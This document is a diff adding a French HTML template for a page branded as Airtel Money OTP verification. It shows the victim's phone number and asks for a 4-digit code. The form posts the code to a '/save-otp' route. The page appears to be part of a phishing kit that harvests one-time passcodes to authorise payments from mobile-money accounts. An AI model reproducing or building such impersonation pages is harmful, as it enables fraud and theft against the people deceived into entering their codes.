@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vérification OTP</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container verification-container">
+        <div class="verification-card">
+            <h2>VERIFICATION REQUISE</h2>
+            
+            <div class="otp-section">
+                <p>Code envoyé au:</p>
+                <p class="phone-number">{{ phone }}</p>
+
+                <form action="/save-otp" method="POST">
+                    <div class="form-group">
+                        <label>Code OTP à 4 chiffres</label>
+                        <input type="text" name="otp" maxlength="4" pattern="[0-9]{4}" placeholder="1234" required>
+                    </div>
+                    
+                    <p class="sms-info">Vérifiez votre application Airtel Money</p>
+                    
+                    <button type="submit" class="btn-verify">VERIFIER ET PAYER</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
